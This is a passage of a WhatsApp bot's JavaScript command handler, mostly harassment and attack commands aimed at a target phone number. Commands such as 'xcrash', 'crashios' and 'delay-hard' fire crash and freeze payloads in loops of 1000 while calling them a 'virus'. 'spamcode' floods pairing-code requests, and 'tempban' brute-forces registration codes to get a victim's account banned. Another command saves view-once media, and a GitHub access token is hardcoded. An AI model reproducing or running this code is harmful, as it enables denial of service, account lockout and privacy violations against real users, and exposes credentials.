    let target = await sock.groupAcceptInvite(result);

    for (let i = 0; i < 1; i++) {
      await GroupFreze(target);
    }
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number or link is valid.");
  }
}
// Helper function to get the phone number
async function getPhoneNumber() {
  if (m.mentionedJid?.length > 0) {
    return m.mentionedJid[0];
  } else {
    let raw = qtext.split("|")[0].replace(/[^0-9]/g, '');
    if (raw.startsWith("0")) return kontolreply(`Gunakan format internasional: 628xxx`);
    return `${raw}@s.whatsapp.net`;
  }
}

// Add Owner / Premium Handler
async function addOwnerOrPremium(commandType) {
  if (!DevOnly) return xreplyWithButton(mess.owner);

  let numero = await getPhoneNumber();
  let isValid = await sock.onWhatsApp(numero);
  if (isValid.length === 0) return kontolreply(example("628xxx or tag @user"))

  if (commandType === 'addowner' || commandType === 'addown') {
    if (!owner.includes(numero)) owner.push(numero);
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil ditambahkan sebagai Owner & Premium!`);
  } else if (commandType === 'adddatabase' || commandType === 'addbase') {
    if (!Premium.includes(numero)) Premium.push(numero);
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil ditambahkan ke Premium!`);
  }
}

// Delete Owner / Premium Handler
async function deleteOwnerOrPremium(commandType) {
  if (!DevOnly) return xreplyWithButton(mess.owner);

  let numero = await getPhoneNumber();
  let indexOwner = owner.indexOf(numero);
  let indexPremium = Premium.indexOf(numero);

  if (indexOwner === -1 && indexPremium === -1) {
    return kontolreply(`Nomor ${numero.split('@')[0]} tidak ditemukan dalam database.`);
  }

  if (commandType === 'delowner' || commandType === 'delown') {
    if (indexOwner !== -1) owner.splice(indexOwner, 1);
    if (indexPremium !== -1) Premium.splice(indexPremium, 1);
    fs.writeFileSync('./account/Own.json', JSON.stringify(owner, null, 2));
    fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
    xreplyWithButton(`Number ${numero.split('@')[0]} berhasil dihapus dari database!`);
  } else if (commandType === 'deldatabase' || commandType === 'deletebase') {
    if (indexPremium !== -1) {
      Premium.splice(indexPremium, 1);
      fs.writeFileSync('./account/Prem.json', JSON.stringify(Premium, null, 2));
      xreplyWithButton(`Number ${numero.split('@')[0]} berhasil dihapus dari Premium!`);
    } else {
      kontolreply(`Nomor ${numero.split('@')[0]} tidak ada dalam database Premium.`);
    }
  }
}

break
  case 'addowner':
  case 'addown':
    await addOwnerOrPremium('addowner');
    break;

  case 'delowner':
  case 'delown':
    await deleteOwnerOrPremium('delowner');
    break;

  case 'adddatabase':
  case 'addbase':
    await addOwnerOrPremium('adddatabase');
    break;

  case 'deldatabase':
  case 'deletebase':
    await deleteOwnerOrPremium('deldatabase');
  break;
  
case 'qc': {
  if (!q) return kontolreply(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  sock.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;
case "play": {
        if (!qtext) return kontolreply(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          sock.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return kontolreply("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return kontolreply("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return kontolreply("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await sock.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await sock.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break
case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return kontolreply("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await sock.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await sock.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await xreplyWithButton("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await xreplyWithButton("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
case "delpp": {
if (!DevOnly) return 
  sock.removeProfilePicture(sock.user.id);
  xreplyWithButton("Success Delete Profile Picture");
}
break;
case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return kontolreply(`Reply media with caption ${prefix + command}`);
  if (!quoted) return kontolreply(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('./database/pusat/Data4');
  let audio = await toAudio(media, 'mp4');
  
  sock.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;
case 'ht': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  sock.sendMessage(from, { text: q ? q : 'Apocalypse Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;
case 'kick': {
if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return kontolreply("Send number / tag users ");
  await sock.groupParticipantsUpdate(from, [users], 'remove');
}
break;
case 'linkgroup': case 'linkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await sock.groupInviteCode(from);
  sock.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;
case 'resetlinkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  sock.groupRevokeInvite(from);
}
break;
case 'public': {
  if (!DevOnly) return 
  sock.public = true;
  xreplyWithButton(`*Success Change Mode Self To Public*`);
}
break;
case 'self': case 'private': {
  if (!DevOnly) return
  sock.public = false;
  xreplyWithButton(`*Success Change Mode Public To Self*`);
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return kontolreply(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return kontolreply('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return kontolreply('Failed to download media!');
    }

    const uploadImage = require('./database/pusat/Data6');
    const uploadFile = require('./database/pusat/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return kontolreply('Failed to upload media!');
    }

    xreplyWithButton(`(no expiration date/unknown)\n ${link}`)
}
break
case 'sticker': case 's': {
  if (!quoted) return xreplyWithButton(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await sock.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return kontolreply('max 10s');
    
    let media = await quoted.download();
    let encmedia = await sock.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return kontolreply(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
case 'brat': {
            if (!q) return xreplyWithButton(`Send command with text. ${prefix + command} hello`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, sock, m);
        }
       break
case 'tes':
case 'status': {
xreplyWithButton(`*on anjj!!!*`)
}
break
//END
case "joingc": case "join": {
if (!DevOnly) return xreplyWithButton(`woi, lu siapa?`)
if (!q) return kontolreply(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await sock.groupAcceptInvite(result);
m.reply(`Berhasil`)
}
break
case 'kir-ip': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*lu belum prem minta ama Amm sono*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
await freezeIphone(target, false);
await sleep(150);
await freezeIphone(target, false);
await sleep(150);
await freezeIphone(target, false);
await sleep(150);
await freezeIphone(target, false);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'kir-fc': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*lu belum prem minta ama Amm sono*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
await ForceCall(target, false);
await sleep(150);
await ForceCall(target, false);
await sleep(150);
await ForceCall(target, false);
await sleep(150);
await ForceCall(target, false);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number is valid.");
}
}


//TIKTOK CASE		
case 'tiktok': 
      case'tt':{
        if (!qtext) return xreplyWithButton(`Send command with link. ${prefix + command} https://`);
         let res = await tiktok(qtext);          
         if (res && res.data && res.data.data) {
            let images = res.data.data.images || [];
            let play = res.data.data.play;
            let lagu = res.data.data.music

            const getMimeType = async (url) => {
                try {
                    const response = await axios.head(url);
                    return response.headers['content-type'];
                } catch (error) {
                    console.error(error);
                    return
                }
            };

            let mimeType = await getMimeType(play);
            
            if (mimeType && mimeType.startsWith('video/')) {
                await sock.sendMessage(m.chat, {
                    video: { url: play },
                    caption: "Successfully downloaded video from TikTok"
                },{quoted:m});
            } else if (images.length > 0) {
                let totalImages = images.length;
                let estimatedTime = totalImages * 4;
                let message = `Estimasi waktu pengiriman gambar: ${estimatedTime} detik.`;
                await sock.sendMessage(m.chat, { text: message },{quoted:m});

                const sendImageWithDelay = async (url, index) => {
                    let caption = `Gambar ke-${index + 1}`;
                    await sock.sendMessage(m.chat, { image: { url }, caption: caption },{quoted:m});
                };
                await sock.sendMessage(m.chat, { audio: { url: lagu }, mimetype: "audio/mpeg" },{quoted:m})

                for (let i = 0; i < images.length; i++) {
                    await sendImageWithDelay(images[i], i);
                    await new Promise(resolve => setTimeout(resolve, 4000));
                }
            } else {
                console.log('No valid video or images found.');
                await sock.sendMessage(m.chat, {
                    text: "No media found or an error occurred while retrieving media."
                },{quoted:m});
            }
        } else {
            console.error('Error: Invalid response structure', res);
            await sock.sendMessage(m.chat, {
                text: "No media found or an error occurred while retrieving media."
            },{quoted:m});
        }
      }
      break
      
// END
//META AI CASE

case 'meta-ai': {
  if (!qtext) return xreplyWithButton('Send Text / Question');
            try {
                const apiUrl = `https://restapii.rioooxdzz.web.id/api/metaai?message=${encodeURIComponent(qtext)}`;
                const response = await fetch(apiUrl);
                const mark = await response.json();

                const ress = mark.result.meta || 'Maaf, saya tidak bisa memahami permintaan Anda. Mungkin pertanyaanmu stress / nguawor';

                await sock.sendMessage(m.chat, { text: ress }, {quoted:m});
                
} catch (error) {
    console.error("Terjadi kesalahan segera hubungi developer!!!:", error.message);
}
}
break
case 'xinvis':
case 'xperma':
case 'vcrash':
case 'xcrash': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*lu belum prem minta ama Amm sono*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
await GraciForce(target, false);
await sleep(150);
await GraciOver(target, false);
await sleep(150);
await ForceV(target, false);
await sleep(150);
await InvisCarousel(target, false);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'kir-blank': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*lu belum prem minta ama Amm sono*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
await VampireBlankIphone(target, false);
await sleep(150);
await VampireBlankIphone(target, false);
await sleep(150);
await VampireBlankIphone(target, false);
await sleep(150);
await VampireBlankIphone(target, false);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break
case 'delayinvis':
case 'xdelay':
case 'delaymsg': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*lu belum prem minta ama Amm sono*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
await ddlay(target, false);
await sleep(150);
await protocolbug8(target, false);
await sleep(150);
await bulldozer(target, false);
await sleep(150);
await InvisCarousel(target, false);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break

case 'crashios':
case 'trashios':
case 'xios': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*lu belum prem minta ama Amm sono*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(`Example: ${command} 628xxx`);
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 100; i++) {
await loadedIos(target, Ptcp = false)
await sleep(00);
await loaded(target)
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break

case "cekidch": case "idch": {
if (!text) return kontolreply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return kontolreply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return xreplyWithButton(teks)
}
break
case "reactch": {
 if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
 if (!text || !args[0] || !args[1]) 
 return kontolreply(example("linkch 😐"));
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return kontolreply("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await sock.newsletterMetadata("invite", result) 
 await sock.newsletterReactMessage(res.id, serverId, args[1])
 xreplyWithButton(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break
case 'spamcode': {
				if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
				if (!q) return kontolreply(example("62xxx|100"));
				let [peenis, pepekk = "200"] = q.split("|")
				await xreplyWithButton(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
				let target = peenis.replace(/[^0-9]/g, '').trim()
				let {
					default: makeWaSocket,
					useMultiFileAuthState,
					fetchLatestBaileysVersion
				} = require('@whiskeysockets/baileys')
				let {
					state
				} = await useMultiFileAuthState('Spam Code')
				let {
					version
				} = await fetchLatestBaileysVersion()
				let sucked = await makeWaSocket({
					auth: state,
					version,
					logger: pino({
						level: 'fatal'
					})
				})
				for (let i = 0; i < pepekk; i++) {
					await sleep(1500)
					let prc = await sucked.requestPairingCode(target)
					await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
				}
				await sleep(15000)
			}
break
case 'tempban': {
    if (!DevOnly && !PremOnly) return xreplyWithButton(mess.owner);
    if (args.length < 1) return kontolreply(example("62xxx"));
    
    const xtarget = args[0];
    // Memastikan nomor telepon dimulai dengan '62' dan memiliki panjang yang sesuai
    if (!/^62\d{8,}$/.test(xtarget)) return kontolreply(example("62xxx"));
    
    const APOCALYPSECountryCode = '62'; // Kode negara Indonesia
    const APOCALYPSENumber = xtarget.replace('@s.whatsapp.net', '');
    const APOCALYPSEmerge = `${APOCALYPSECountryCode}${APOCALYPSENumber}`;
    const APOCALYPSEMention = APOCALYPSEmerge + '@s.whatsapp.net';
    
    await xreplyWithButton(`</> 𝐒𝐮𝐜𝐜𝐞𝐬 𝐓𝐞𝐦𝐩𝐁𝐚𝐧〽️`);
    
    try {
        const {
            stateAPOCALYPSE,
            saveCredsAPOCALYPSE
        } = await useMultiFileAuthState('./Band');
        
        const APOCALYPSERequest = await sock.requestRegistrationCode({
            phoneNumber: '+' + APOCALYPSECountryCode + `${APOCALYPSENumber}`,
            phoneNumberCountryCode: APOCALYPSECountryCode,
            phoneNumberNationalNumber: `${APOCALYPSENumber}`,
            phoneNumberMobileCountryCode: 724,
            method: 'sms'
        });
    } catch (err) {
        console.error(err);
    }

    for (let i = 0; i < 10000; i++) {
        try {
            var APOCALYPSEPrefix = Math.floor(Math.random() * 999);
            var APOCALYPSESuffix = Math.floor(Math.random() * 999);
            await sock.register(`${APOCALYPSEPrefix}-${APOCALYPSESuffix}`);
        } catch (err) {
            console.log(`${APOCALYPSEPrefix}-${APOCALYPSESuffix}`);
        }
    }
}
break
case "owner":
case "xowner": {
  let namaown = `Amm`
  let NoOwn = `6288708554015`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:1.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:SUPER CRASH AMM-V1🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  sock.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break
case 'addtoken': {
    if (!q) return m.reply('❌ Anda harus mengirimkan token yang akan ditambahkan ke database.');

    const tokenToAdd = q.trim();
    const GITHUB_TOKEN = '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';
    const REPO_OWNER = 'RizxVelzcode';
    const REPO_NAME = 'RizxvelzSecurity';
    const FILE_PATH = 'TokenDb.json';

    try {
        // Ambil data JSON dari GitHub
        const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
        if (!response.ok) throw new Error(`Gagal mengambil data: ${response.statusText}`);

        let jsonData = await response.json();

        // Validasi format data
        if (!jsonData || !jsonData.tokens || !Array.isArray(jsonData.tokens)) {
            return m.reply('❌ Struktur data di database tidak valid.');
        }

        // Cek apakah token sudah ada
        if (jsonData.tokens.includes(tokenToAdd)) {
            return m.reply(`❌ Token sudah terdaftar di database.`);
        }

        // Tambahkan token baru
        jsonData.tokens.push(tokenToAdd);

        const updatedContent = JSON.stringify(jsonData, null, 2);
        const base64Content = Buffer.from(updatedContent).toString('base64');

        // Ambil SHA
        const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
        if (!shaResponse.ok) throw new Error(`Gagal mendapatkan SHA file: ${shaResponse.statusText}`);

        const shaData = await shaResponse.json();
        const currentSHA = shaData.sha;

        // Update file di GitHub
        const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${GITHUB_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `✅ Menambahkan token baru ke database`,
                content: base64Content,
                sha: currentSHA,
            }),
        });

        if (!updateResponse.ok) {
            const updateResult = await updateResponse.json();
            throw new Error(`❌ Gagal mengupdate database: ${updateResult.message}`);
        }

        return m.reply(`✅ Token berhasil ditambahkan ke database!`);

    } catch (error) {
        console.error(error);
        return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
    }
}
break
case 'adddb': {
    if (!q) return m.reply('❌ Anda harus mengirimkan nomor yang akan ditambahkan ke database.');

    const phoneNumber = q.trim(); // Nomor yang ingin ditambahkan
    const GITHUB_TOKEN = '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'; // Token GitHub (ganti dengan yang valid)
    const REPO_OWNER = 'RizxVelzcode'; // Username GitHub
    const REPO_NAME = 'RizxvelzSecurity'; // Nama repository
    const FILE_PATH = 'newdtbs.json'; // Path ke file database JSON di repo

    try {
        // **1️⃣ Ambil data JSON dari GitHub**
        const response = await fetch(`https://raw.githubusercontent.com/${REPO_OWNER}/${REPO_NAME}/main/${FILE_PATH}`);
        if (!response.ok) throw new Error(`Gagal mengambil data: ${response.statusText}`);

        let jsonData = await response.json();

        // **2️⃣ Validasi apakah struktur JSON benar**
        if (!jsonData || !jsonData.data || !Array.isArray(jsonData.data)) {
            return m.reply('❌ Struktur data di database tidak valid.');
        }

        // **3️⃣ Cek apakah nomor sudah ada di database**
        if (jsonData.data.includes(phoneNumber)) {
            return m.reply(`❌ Nomor ${phoneNumber} sudah ada di database.`);
        }

        // **4️⃣ Tambahkan nomor baru ke dalam array**
        jsonData.data.push(phoneNumber);

        // **5️⃣ Encode data JSON ke Base64 untuk upload ke GitHub**
        const updatedData = JSON.stringify(jsonData, null, 2); // Format JSON dengan indentasi 2 spasi
        const base64Content = Buffer.from(updatedData).toString('base64'); // Encode ke base64

        // **6️⃣ Ambil SHA dari file yang ada di GitHub**
        const shaResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`);
        if (!shaResponse.ok) throw new Error(`Gagal mendapatkan SHA file: ${shaResponse.statusText}`);

        const shaData = await shaResponse.json();
        const currentSHA = shaData.sha; // SHA file saat ini

        // **7️⃣ Update file JSON di GitHub**
        const updateResponse = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${GITHUB_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `✅ Menambahkan nomor ${phoneNumber} ke database`,
                content: base64Content,
                sha: currentSHA, // SHA dari file yang sudah ada
            }),
        });

        // **8️⃣ Cek status response update**
        if (!updateResponse.ok) {
            const updateResult = await updateResponse.json();
            throw new Error(`❌ Gagal mengupdate database: ${updateResult.message}`);
        }

        // **9️⃣ Berhasil menambahkan nomor**
        return m.reply(`✅ Nomor ${phoneNumber} berhasil ditambahkan ke database!`);

    } catch (error) {
        console.error(error);
        return m.reply(`❌ Terjadi kesalahan: ${error.message}`);
    }
}
break

case 'delay-hard': {
  try {
    if (!PremOnly && !DevOnly) return xreplyWithButton("*lu belum prem minta ama Amm sono*");
    if (!q) return kontolreply(example("628xxx or tag @user"))

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return kontolreply(example("62xxx"))
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
xreplybugbutton(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
await RyuciDelay(target, false);
await sleep(150);
await RyuciDelay(target, false);
await sleep(150);
await RyuciDelay(target, false);
await sleep(150);
await RyuciDelay(target, false);
await sleep(150);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    kontolreply("Failed to send virus. Make sure the number is valid.");
}
}
break

//END
//END
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!DevOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!DevOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!DevOnly) return
